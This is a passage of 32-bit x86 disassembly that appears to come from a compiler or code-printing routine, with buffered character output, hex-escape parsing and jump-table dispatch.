  404c28:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404c2f:	e9 02 ee ff ff       	jmp    0x403a36
  404c34:	8b 4d 04             	mov    0x4(%ebp),%ecx
  404c37:	8b 54 24 18          	mov    0x18(%esp),%edx
  404c3b:	89 d8                	mov    %ebx,%eax
  404c3d:	e8 ce e2 ff ff       	call   0x402f10
  404c42:	e9 b9 e3 ff ff       	jmp    0x403000
  404c47:	8b 93 1c 01 00 00    	mov    0x11c(%ebx),%edx
  404c4d:	eb 18                	jmp    0x404c67
  404c4f:	90                   	nop
  404c50:	8b 40 08             	mov    0x8(%eax),%eax
  404c53:	83 ea 01             	sub    $0x1,%edx
  404c56:	85 c0                	test   %eax,%eax
  404c58:	0f 84 22 e4 ff ff    	je     0x403080
  404c5e:	83 38 2f             	cmpl   $0x2f,(%eax)
  404c61:	0f 85 19 e4 ff ff    	jne    0x403080
  404c67:	83 fa 00             	cmp    $0x0,%edx
  404c6a:	7f e4                	jg     0x404c50
  404c6c:	0f 85 0e e4 ff ff    	jne    0x403080
  404c72:	8b 40 04             	mov    0x4(%eax),%eax
  404c75:	85 c0                	test   %eax,%eax
  404c77:	0f 85 64 f2 ff ff    	jne    0x403ee1
  404c7d:	e9 fe e3 ff ff       	jmp    0x403080
  404c82:	8b 71 04             	mov    0x4(%ecx),%esi
  404c85:	8b 79 08             	mov    0x8(%ecx),%edi
  404c88:	01 f7                	add    %esi,%edi
  404c8a:	39 fe                	cmp    %edi,%esi
  404c8c:	72 2f                	jb     0x404cbd
  404c8e:	e9 6d e3 ff ff       	jmp    0x403000
  404c93:	8b 83 00 01 00 00    	mov    0x100(%ebx),%eax
  404c99:	3d ff 00 00 00       	cmp    $0xff,%eax
  404c9e:	74 75                	je     0x404d15
  404ca0:	8d 48 01             	lea    0x1(%eax),%ecx
  404ca3:	89 8b 00 01 00 00    	mov    %ecx,0x100(%ebx)
  404ca9:	88 14 03             	mov    %dl,(%ebx,%eax,1)
  404cac:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  404cb2:	83 c6 01             	add    $0x1,%esi
  404cb5:	39 f7                	cmp    %esi,%edi
  404cb7:	0f 86 43 e3 ff ff    	jbe    0x403000
  404cbd:	89 f8                	mov    %edi,%eax
  404cbf:	0f b6 16             	movzbl (%esi),%edx
  404cc2:	29 f0                	sub    %esi,%eax
  404cc4:	83 f8 03             	cmp    $0x3,%eax
  404cc7:	7e ca                	jle    0x404c93
  404cc9:	80 fa 5f             	cmp    $0x5f,%dl
  404ccc:	75 c5                	jne    0x404c93
  404cce:	80 7e 01 5f          	cmpb   $0x5f,0x1(%esi)
  404cd2:	75 bf                	jne    0x404c93
  404cd4:	80 7e 02 55          	cmpb   $0x55,0x2(%esi)
  404cd8:	75 b9                	jne    0x404c93
  404cda:	8d 6e 03             	lea    0x3(%esi),%ebp
  404cdd:	39 ef                	cmp    %ebp,%edi
  404cdf:	76 b2                	jbe    0x404c93
  404ce1:	31 d2                	xor    %edx,%edx
  404ce3:	eb 13                	jmp    0x404cf8
  404ce5:	83 e8 30             	sub    $0x30,%eax
  404ce8:	c1 e2 04             	shl    $0x4,%edx
  404ceb:	83 c5 01             	add    $0x1,%ebp
  404cee:	01 c2                	add    %eax,%edx
  404cf0:	39 fd                	cmp    %edi,%ebp
  404cf2:	0f 84 5d 08 00 00    	je     0x405555
  404cf8:	0f be 45 00          	movsbl 0x0(%ebp),%eax
  404cfc:	8d 48 d0             	lea    -0x30(%eax),%ecx
  404cff:	80 f9 09             	cmp    $0x9,%cl
  404d02:	76 e1                	jbe    0x404ce5
  404d04:	8d 48 bf             	lea    -0x41(%eax),%ecx
  404d07:	80 f9 05             	cmp    $0x5,%cl
  404d0a:	0f 87 38 03 00 00    	ja     0x405048
  404d10:	83 e8 37             	sub    $0x37,%eax
  404d13:	eb d3                	jmp    0x404ce8
  404d15:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404d1b:	88 54 24 18          	mov    %dl,0x18(%esp)
  404d1f:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  404d26:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404d2d:	00 
  404d2e:	89 1c 24             	mov    %ebx,(%esp)
  404d31:	89 44 24 08          	mov    %eax,0x8(%esp)
  404d35:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404d3b:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404d42:	b9 01 00 00 00       	mov    $0x1,%ecx
  404d47:	31 c0                	xor    %eax,%eax
  404d49:	0f b6 54 24 18       	movzbl 0x18(%esp),%edx
  404d4e:	e9 50 ff ff ff       	jmp    0x404ca3
  404d53:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%ebx)
  404d5a:	00 00 00 
  404d5d:	e9 9e e2 ff ff       	jmp    0x403000
  404d62:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404d68:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  404d6f:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404d76:	00 
  404d77:	89 1c 24             	mov    %ebx,(%esp)
  404d7a:	89 44 24 08          	mov    %eax,0x8(%esp)
  404d7e:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404d84:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404d8b:	ba 01 00 00 00       	mov    $0x1,%edx
  404d90:	31 c0                	xor    %eax,%eax
  404d92:	e9 dc f1 ff ff       	jmp    0x403f73
  404d97:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404d9d:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  404da4:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404dab:	00 
  404dac:	89 1c 24             	mov    %ebx,(%esp)
  404daf:	89 44 24 08          	mov    %eax,0x8(%esp)
  404db3:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404db9:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404dc0:	ba 01 00 00 00       	mov    $0x1,%edx
  404dc5:	31 c0                	xor    %eax,%eax
  404dc7:	e9 f5 f7 ff ff       	jmp    0x4045c1
  404dcc:	ba 39 7a 42 00       	mov    $0x427a39,%edx
  404dd1:	89 d8                	mov    %ebx,%eax
  404dd3:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  404dd7:	e8 e4 df ff ff       	call   0x402dc0
  404ddc:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404de0:	8b 41 08             	mov    0x8(%ecx),%eax
  404de3:	8d 50 01             	lea    0x1(%eax),%edx
  404de6:	89 d8                	mov    %ebx,%eax
  404de8:	e8 63 e0 ff ff       	call   0x402e50
  404ded:	ba 47 7a 42 00       	mov    $0x427a47,%edx
  404df2:	89 d8                	mov    %ebx,%eax
  404df4:	e8 c7 df ff ff       	call   0x402dc0
  404df9:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  404dfd:	8b 49 04             	mov    0x4(%ecx),%ecx
  404e00:	e9 c8 f6 ff ff       	jmp    0x4044cd
  404e05:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404e0b:	89 54 24 18          	mov    %edx,0x18(%esp)
  404e0f:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  404e16:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404e1d:	00 
  404e1e:	89 1c 24             	mov    %ebx,(%esp)
  404e21:	89 44 24 08          	mov    %eax,0x8(%esp)
  404e25:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404e2b:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404e32:	b9 01 00 00 00       	mov    $0x1,%ecx
  404e37:	31 c0                	xor    %eax,%eax
  404e39:	8b 54 24 18          	mov    0x18(%esp),%edx
  404e3d:	e9 8c e7 ff ff       	jmp    0x4035ce
  404e42:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404e48:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  404e4f:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404e56:	00 
  404e57:	89 1c 24             	mov    %ebx,(%esp)
  404e5a:	89 44 24 08          	mov    %eax,0x8(%esp)
  404e5e:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404e64:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404e6b:	ba 01 00 00 00       	mov    $0x1,%edx
  404e70:	31 c0                	xor    %eax,%eax
  404e72:	e9 d3 f6 ff ff       	jmp    0x40454a
  404e77:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404e7d:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  404e84:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404e8b:	00 
  404e8c:	89 1c 24             	mov    %ebx,(%esp)
  404e8f:	89 44 24 08          	mov    %eax,0x8(%esp)
  404e93:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404e99:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404ea0:	ba 01 00 00 00       	mov    $0x1,%edx
  404ea5:	31 c0                	xor    %eax,%eax
  404ea7:	e9 66 f6 ff ff       	jmp    0x404512
  404eac:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404eb2:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  404eb9:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404ec0:	00 
  404ec1:	89 1c 24             	mov    %ebx,(%esp)
  404ec4:	89 44 24 08          	mov    %eax,0x8(%esp)
  404ec8:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404ece:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404ed5:	ba 01 00 00 00       	mov    $0x1,%edx
  404eda:	31 c0                	xor    %eax,%eax
  404edc:	e9 eb e0 ff ff       	jmp    0x402fcc
  404ee1:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  404ee7:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  404eee:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  404ef5:	00 
  404ef6:	89 1c 24             	mov    %ebx,(%esp)
  404ef9:	89 44 24 08          	mov    %eax,0x8(%esp)
  404efd:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  404f03:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  404f0a:	ba 01 00 00 00       	mov    $0x1,%edx
  404f0f:	31 c0                	xor    %eax,%eax
  404f11:	e9 83 e0 ff ff       	jmp    0x402f99
  404f16:	8b 83 14 01 00 00    	mov    0x114(%ebx),%eax
  404f1c:	8b 54 24 18          	mov    0x18(%esp),%edx
  404f20:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  404f24:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  404f2b:	00 
  404f2c:	89 44 24 40          	mov    %eax,0x40(%esp)
  404f30:	8d 44 24 40          	lea    0x40(%esp),%eax
  404f34:	83 e2 9f             	and    $0xffffff9f,%edx
  404f37:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  404f3d:	8b 83 10 01 00 00    	mov    0x110(%ebx),%eax
  404f43:	8b 4d 04             	mov    0x4(%ebp),%ecx
  404f46:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  404f4a:	89 d8                	mov    %ebx,%eax
  404f4c:	e8 bf df ff ff       	call   0x402f10
  404f51:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  404f55:	8b 44 24 40          	mov    0x40(%esp),%eax
  404f59:	85 c9                	test   %ecx,%ecx
  404f5b:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  404f61:	0f 85 99 e0 ff ff    	jne    0x403000
  404f67:	ba 20 00 00 00       	mov    $0x20,%edx
  404f6c:	89 d8                	mov    %ebx,%eax
  404f6e:	e8 8d d9 ff ff       	call   0x402900
  404f73:	e9 cf ed ff ff       	jmp    0x403d47
  404f78:	8b 54 24 18          	mov    0x18(%esp),%edx
  404f7c:	89 e9                	mov    %ebp,%ecx
  404f7e:	89 d8                	mov    %ebx,%eax
  404f80:	e8 8b df ff ff       	call   0x402f10
  404f85:	e9 76 e0 ff ff       	jmp    0x403000
  404f8a:	8b 49 08             	mov    0x8(%ecx),%ecx
  404f8d:	8b 11                	mov    (%ecx),%edx
  404f8f:	85 d2                	test   %edx,%edx
  404f91:	0f 85 ee df ff ff    	jne    0x402f85
  404f97:	83 f8 3c             	cmp    $0x3c,%eax
  404f9a:	0f 84 70 06 00 00    	je     0x405610
  404fa0:	8b 54 24 18          	mov    0x18(%esp),%edx
  404fa4:	89 d8                	mov    %ebx,%eax
  404fa6:	83 ee 02             	sub    $0x2,%esi
  404fa9:	e8 62 df ff ff       	call   0x402f10
  404fae:	83 fe 04             	cmp    $0x4,%esi
  404fb1:	0f 87 49 e0 ff ff    	ja     0x403000
  404fb7:	ff 24 b5 c8 7d 42 00 	jmp    *0x427dc8(,%esi,4)
  404fbe:	ba fa 7b 42 00       	mov    $0x427bfa,%edx
  404fc3:	89 d8                	mov    %ebx,%eax
  404fc5:	e8 f6 dd ff ff       	call   0x402dc0
  404fca:	e9 31 e0 ff ff       	jmp    0x403000
  404fcf:	ba f7 7b 42 00       	mov    $0x427bf7,%edx
  404fd4:	89 d8                	mov    %ebx,%eax
  404fd6:	e8 e5 dd ff ff       	call   0x402dc0
  404fdb:	e9 20 e0 ff ff       	jmp    0x403000
  404fe0:	ba 6c 00 00 00       	mov    $0x6c,%edx
  404fe5:	89 d8                	mov    %ebx,%eax
  404fe7:	e8 14 d9 ff ff       	call   0x402900
  404fec:	e9 0f e0 ff ff       	jmp    0x403000
  404ff1:	ba 75 00 00 00       	mov    $0x75,%edx
  404ff6:	89 d8                	mov    %ebx,%eax
  404ff8:	e8 03 d9 ff ff       	call   0x402900
  404ffd:	e9 fe df ff ff       	jmp    0x403000
  405002:	ba fd 7b 42 00       	mov    $0x427bfd,%edx
  405007:	89 d8                	mov    %ebx,%eax
  405009:	e8 b2 dd ff ff       	call   0x402dc0
  40500e:	e9 ed df ff ff       	jmp    0x403000
  405013:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  405019:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  405020:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  405027:	00 
  405028:	89 1c 24             	mov    %ebx,(%esp)
  40502b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40502f:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  405035:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  40503c:	ba 01 00 00 00       	mov    $0x1,%edx
  405041:	31 c0                	xor    %eax,%eax
  405043:	e9 97 ea ff ff       	jmp    0x403adf
  405048:	8d 48 9f             	lea    -0x61(%eax),%ecx
  40504b:	80 f9 05             	cmp    $0x5,%cl
  40504e:	0f 87 4a 05 00 00    	ja     0x40559e
  405054:	83 e8 57             	sub    $0x57,%eax
  405057:	e9 8c fc ff ff       	jmp    0x404ce8
  40505c:	8b 48 04             	mov    0x4(%eax),%ecx
  40505f:	8b 83 14 01 00 00    	mov    0x114(%ebx),%eax
  405065:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  405069:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  405070:	00 
  405071:	89 44 24 40          	mov    %eax,0x40(%esp)
  405075:	8d 44 24 40          	lea    0x40(%esp),%eax
  405079:	85 c9                	test   %ecx,%ecx
  40507b:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  405081:	8b 83 10 01 00 00    	mov    0x110(%ebx),%eax
  405087:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  40508b:	0f 85 2b f3 ff ff    	jne    0x4043bc
  405091:	e9 23 f3 ff ff       	jmp    0x4043b9
  405096:	8d 76 00             	lea    0x0(%esi),%esi
  405099:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  4050a0:	ba 20 00 00 00       	mov    $0x20,%edx
  4050a5:	89 d8                	mov    %ebx,%eax
  4050a7:	e8 54 d8 ff ff       	call   0x402900
  4050ac:	e9 ae ee ff ff       	jmp    0x403f5f
  4050b1:	ba 20 00 00 00       	mov    $0x20,%edx
  4050b6:	89 d8                	mov    %ebx,%eax
  4050b8:	e8 43 d8 ff ff       	call   0x402900
  4050bd:	e9 dd ee ff ff       	jmp    0x403f9f
  4050c2:	89 d8                	mov    %ebx,%eax
  4050c4:	ba 5b 00 00 00       	mov    $0x5b,%edx
  4050c9:	e8 32 d8 ff ff       	call   0x402900
  4050ce:	8b 54 24 18          	mov    0x18(%esp),%edx
  4050d2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4050d5:	89 d8                	mov    %ebx,%eax
  4050d7:	e8 34 de ff ff       	call   0x402f10
  4050dc:	ba 5d 00 00 00       	mov    $0x5d,%edx
  4050e1:	89 d8                	mov    %ebx,%eax
  4050e3:	e8 18 d8 ff ff       	call   0x402900
  4050e8:	e9 13 df ff ff       	jmp    0x403000
  4050ed:	ba 2d 00 00 00       	mov    $0x2d,%edx
  4050f2:	89 d8                	mov    %ebx,%eax
  4050f4:	e8 07 d8 ff ff       	call   0x402900
  4050f9:	e9 e9 de ff ff       	jmp    0x402fe7
  4050fe:	0f b6 3a             	movzbl (%edx),%edi
  405101:	8d 4f 8e             	lea    -0x72(%edi),%ecx
  405104:	80 f9 01             	cmp    $0x1,%cl
  405107:	76 0e                	jbe    0x405117
  405109:	83 ef 63             	sub    $0x63,%edi
  40510c:	89 f9                	mov    %edi,%ecx
  40510e:	80 f9 01             	cmp    $0x1,%cl
  405111:	0f 87 4a e6 ff ff    	ja     0x403761
  405117:	8b 7c 24 18          	mov    0x18(%esp),%edi
  40511b:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40511f:	89 d8                	mov    %ebx,%eax
  405121:	89 fa                	mov    %edi,%edx
  405123:	e8 d8 17 00 00       	call   0x406900
  405128:	89 d8                	mov    %ebx,%eax
  40512a:	ba 3c 00 00 00       	mov    $0x3c,%edx
  40512f:	e8 cc d7 ff ff       	call   0x402900
  405134:	8b 45 08             	mov    0x8(%ebp),%eax
  405137:	89 fa                	mov    %edi,%edx
  405139:	8b 48 04             	mov    0x4(%eax),%ecx
  40513c:	89 d8                	mov    %ebx,%eax
  40513e:	e8 cd dd ff ff       	call   0x402f10
  405143:	89 d8                	mov    %ebx,%eax
  405145:	ba 95 7c 42 00       	mov    $0x427c95,%edx
  40514a:	e8 71 dc ff ff       	call   0x402dc0
  40514f:	8b 45 08             	mov    0x8(%ebp),%eax
  405152:	89 fa                	mov    %edi,%edx
  405154:	8b 48 08             	mov    0x8(%eax),%ecx
  405157:	89 d8                	mov    %ebx,%eax
  405159:	e8 b2 dd ff ff       	call   0x402f10
  40515e:	ba 29 00 00 00       	mov    $0x29,%edx
  405163:	89 d8                	mov    %ebx,%eax
  405165:	e8 96 d7 ff ff       	call   0x402900
  40516a:	e9 91 de ff ff       	jmp    0x403000
  40516f:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  405175:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40517c:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  405183:	00 
  405184:	89 1c 24             	mov    %ebx,(%esp)
  405187:	89 44 24 08          	mov    %eax,0x8(%esp)
  40518b:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  405191:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  405198:	ba 01 00 00 00       	mov    $0x1,%edx
  40519d:	31 c0                	xor    %eax,%eax
  40519f:	e9 ac f6 ff ff       	jmp    0x404850
  4051a4:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  4051aa:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  4051b1:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4051b8:	00 
  4051b9:	89 1c 24             	mov    %ebx,(%esp)
  4051bc:	89 44 24 08          	mov    %eax,0x8(%esp)
  4051c0:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  4051c6:	83 83 20 01 00 00 01 	addl   $0x1,0x120(%ebx)
  4051cd:	ba 01 00 00 00       	mov    $0x1,%edx
  4051d2:	31 c0                	xor    %eax,%eax
  4051d4:	e9 d7 f2 ff ff       	jmp    0x4044b0
  4051d9:	8b 70 04             	mov    0x4(%eax),%esi
  4051dc:	bf 4b 7a 42 00       	mov    $0x427a4b,%edi
  4051e1:	b9 06 00 00 00       	mov    $0x6,%ecx
  4051e6:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4051e8:	0f 85 57 ed ff ff    	jne    0x403f45
  4051ee:	8b 54 24 18          	mov    0x18(%esp),%edx
  4051f2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4051f5:	89 d8                	mov    %ebx,%eax
  4051f7:	e8 14 dd ff ff       	call   0x402f10
  4051fc:	ba 52 7a 42 00       	mov    $0x427a52,%edx
  405201:	89 d8                	mov    %ebx,%eax
  405203:	e8 b8 db ff ff       	call   0x402dc0
  405208:	e9 9e ed ff ff       	jmp    0x403fab
  40520d:	8b 44 24 24          	mov    0x24(%esp),%eax
  405211:	e9 fe ea ff ff       	jmp    0x403d14
  405216:	83 fa 04             	cmp    $0x4,%edx
  405219:	8b 6c 24 28          	mov    0x28(%esp),%ebp
  40521d:	0f 84 1c 01 00 00    	je     0x40533f
  405223:	83 fa 02             	cmp    $0x2,%edx
  405226:	0f 85 29 01 00 00    	jne    0x405355
  40522c:	8b 4f 08             	mov    0x8(%edi),%ecx
  40522f:	83 39 45             	cmpl   $0x45,(%ecx)
  405232:	0f 84 49 03 00 00    	je     0x405581
  405238:	8b 01                	mov    (%ecx),%eax
  40523a:	83 e8 1c             	sub    $0x1c,%eax
  40523d:	83 f8 04             	cmp    $0x4,%eax
  405240:	0f 87 0f 01 00 00    	ja     0x405355
  405246:	83 fe 04             	cmp    $0x4,%esi
  405249:	0f 84 7b ee ff ff    	je     0x4040ca
  40524f:	89 f0                	mov    %esi,%eax
  405251:	89 7c 24 28          	mov    %edi,0x28(%esp)
  405255:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  405259:	c1 e0 04             	shl    $0x4,%eax
  40525c:	03 44 24 20          	add    0x20(%esp),%eax
  405260:	eb 0c                	jmp    0x40526e
  405262:	83 c0 10             	add    $0x10,%eax
  405265:	83 fe 04             	cmp    $0x4,%esi
  405268:	0f 84 5c ee ff ff    	je     0x4040ca
  40526e:	8b 50 f4             	mov    -0xc(%eax),%edx
  405271:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  405277:	83 c6 01             	add    $0x1,%esi
  40527a:	89 48 f4             	mov    %ecx,-0xc(%eax)
  40527d:	89 50 04             	mov    %edx,0x4(%eax)
  405280:	8b 50 f8             	mov    -0x8(%eax),%edx
  405283:	c7 40 f8 00 00 00 00 	movl   $0x0,-0x8(%eax)
  40528a:	89 50 08             	mov    %edx,0x8(%eax)
  40528d:	8b 50 fc             	mov    -0x4(%eax),%edx
  405290:	89 78 fc             	mov    %edi,-0x4(%eax)
  405293:	89 50 0c             	mov    %edx,0xc(%eax)
  405296:	8d 50 f0             	lea    -0x10(%eax),%edx
  405299:	89 10                	mov    %edx,(%eax)
  40529b:	8b 49 04             	mov    0x4(%ecx),%ecx
  40529e:	8b 11                	mov    (%ecx),%edx
  4052a0:	83 ea 1c             	sub    $0x1c,%edx
  4052a3:	83 fa 04             	cmp    $0x4,%edx
  4052a6:	76 ba                	jbe    0x405262
  4052a8:	8b 7c 24 28          	mov    0x28(%esp),%edi
  4052ac:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4052af:	89 d8                	mov    %ebx,%eax
  4052b1:	8b 54 24 18          	mov    0x18(%esp),%edx
  4052b5:	e8 56 dc ff ff       	call   0x402f10
  4052ba:	83 3f 04             	cmpl   $0x4,(%edi)
  4052bd:	0f 84 a9 00 00 00    	je     0x40536c
  4052c3:	85 f6                	test   %esi,%esi
  4052c5:	74 3b                	je     0x405302
  4052c7:	8b 7c 24 20          	mov    0x20(%esp),%edi
  4052cb:	89 f0                	mov    %esi,%eax
  4052cd:	c1 e0 04             	shl    $0x4,%eax
  4052d0:	8d 7c 07 f8          	lea    -0x8(%edi,%eax,1),%edi
  4052d4:	eb 07                	jmp    0x4052dd
  4052d6:	83 ef 10             	sub    $0x10,%edi
  4052d9:	85 f6                	test   %esi,%esi
  4052db:	74 25                	je     0x405302
  4052dd:	8b 2f                	mov    (%edi),%ebp
  4052df:	83 ee 01             	sub    $0x1,%esi
  4052e2:	85 ed                	test   %ebp,%ebp
  4052e4:	75 f0                	jne    0x4052d6
  4052e6:	89 d8                	mov    %ebx,%eax
  4052e8:	ba 20 00 00 00       	mov    $0x20,%edx
  4052ed:	e8 0e d6 ff ff       	call   0x402900
  4052f2:	8b 4f fc             	mov    -0x4(%edi),%ecx
  4052f5:	8b 54 24 18          	mov    0x18(%esp),%edx
  4052f9:	89 d8                	mov    %ebx,%eax
  4052fb:	e8 60 03 00 00       	call   0x405660
  405300:	eb d4                	jmp    0x4052d6
  405302:	8b 44 24 24          	mov    0x24(%esp),%eax
  405306:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  40530c:	e9 ef dc ff ff       	jmp    0x403000
  405311:	89 d8                	mov    %ebx,%eax
  405313:	ba 5b 00 00 00       	mov    $0x5b,%edx
  405318:	e8 e3 d5 ff ff       	call   0x402900
  40531d:	8b 45 08             	mov    0x8(%ebp),%eax
  405320:	8b 54 24 18          	mov    0x18(%esp),%edx
  405324:	8b 48 08             	mov    0x8(%eax),%ecx
  405327:	89 d8                	mov    %ebx,%eax
  405329:	e8 e2 db ff ff       	call   0x402f10
  40532e:	ba 5d 00 00 00       	mov    $0x5d,%edx
  405333:	89 d8                	mov    %ebx,%eax
  405335:	e8 c6 d5 ff ff       	call   0x402900
  40533a:	e9 a7 e4 ff ff       	jmp    0x4037e6
  40533f:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  405343:	89 7c 24 3c          	mov    %edi,0x3c(%esp)
  405347:	89 44 24 38          	mov    %eax,0x38(%esp)
  40534b:	8d 44 24 38          	lea    0x38(%esp),%eax
  40534f:	89 83 10 01 00 00    	mov    %eax,0x110(%ebx)
  405355:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405358:	8b 54 24 18          	mov    0x18(%esp),%edx
  40535c:	89 d8                	mov    %ebx,%eax
  40535e:	e8 ad db ff ff       	call   0x402f10
  405363:	83 3f 04             	cmpl   $0x4,(%edi)
  405366:	0f 85 5b ff ff ff    	jne    0x4052c7
  40536c:	8b 44 24 38          	mov    0x38(%esp),%eax
  405370:	89 83 10 01 00 00    	mov    %eax,0x110(%ebx)
  405376:	e9 48 ff ff ff       	jmp    0x4052c3
  40537b:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  40537f:	8b 54 24 18          	mov    0x18(%esp),%edx
  405383:	89 d8                	mov    %ebx,%eax
  405385:	e8 76 15 00 00       	call   0x406900
  40538a:	e9 46 e4 ff ff       	jmp    0x4037d5
  40538f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405392:	8b 54 24 18          	mov    0x18(%esp),%edx
  405396:	89 d8                	mov    %ebx,%eax
  405398:	e8 73 db ff ff       	call   0x402f10
  40539d:	83 7c 24 48 00       	cmpl   $0x0,0x48(%esp)
  4053a2:	8b 44 24 24          	mov    0x24(%esp),%eax
  4053a6:	89 83 14 01 00 00    	mov    %eax,0x114(%ebx)
  4053ac:	0f 84 62 e9 ff ff    	je     0x403d14
  4053b2:	e9 49 dc ff ff       	jmp    0x403000
  4053b7:	8b 41 08             	mov    0x8(%ecx),%eax
  4053ba:	83 38 29             	cmpl   $0x29,(%eax)
  4053bd:	74 0a                	je     0x4053c9
  4053bf:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%ebx)
  4053c6:	00 00 00 
  4053c9:	8b 49 04             	mov    0x4(%ecx),%ecx
  4053cc:	8b 54 24 18          	mov    0x18(%esp),%edx
  4053d0:	89 d8                	mov    %ebx,%eax
  4053d2:	e8 c9 15 00 00       	call   0x4069a0
  4053d7:	e9 b9 e3 ff ff       	jmp    0x403795
  4053dc:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4053e0:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4053e4:	89 d8                	mov    %ebx,%eax
  4053e6:	89 fa                	mov    %edi,%edx
  4053e8:	e8 b3 15 00 00       	call   0x4069a0
  4053ed:	89 e9                	mov    %ebp,%ecx
  4053ef:	89 fa                	mov    %edi,%edx
  4053f1:	89 d8                	mov    %ebx,%eax
  4053f3:	e8 08 15 00 00       	call   0x406900
  4053f8:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4053fc:	89 fa                	mov    %edi,%edx
  4053fe:	89 d8                	mov    %ebx,%eax
  405400:	e8 9b 15 00 00       	call   0x4069a0
  405405:	89 d8                	mov    %ebx,%eax
  405407:	ba ee 7b 42 00       	mov    $0x427bee,%edx
  40540c:	e8 af d9 ff ff       	call   0x402dc0
  405411:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  405415:	89 fa                	mov    %edi,%edx
  405417:	89 d8                	mov    %ebx,%eax
  405419:	e8 82 15 00 00       	call   0x4069a0
  40541e:	e9 dd db ff ff       	jmp    0x403000
  405423:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
